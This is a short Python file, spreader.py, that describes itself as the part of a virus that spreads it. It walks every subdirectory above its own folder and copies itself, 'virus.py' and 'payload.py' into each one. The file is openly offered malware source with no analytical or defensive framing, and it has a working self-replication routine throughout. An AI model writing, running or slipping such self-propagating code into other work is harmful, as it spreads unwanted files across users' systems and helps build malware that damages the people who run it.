# spreader.py - This file contains the functionality to spread the virus to other directories.

import os
import shutil

# Function to copy the virus to another directory.
def spread_virus(target_directory):
    if not os.path.exists(target_directory):
        os.makedirs(target_directory)
    shutil.copy(__file__, target_directory)
    shutil.copy('virus.py', target_directory)
    shutil.copy('payload.py', target_directory)

# Function to find and spread the virus to all subdirectories.
def spread_to_subdirectories():
    for root, dirs, files in os.walk('..'):
        for dir in dirs:
            target_directory = os.path.join(root, dir)
            spread_virus(target_directory)

# Main function to execute the spreader.
def main():
    # Spread the virus to all subdirectories.
    spread_to_subdirectories()

if __name__ == "__main__":
    main()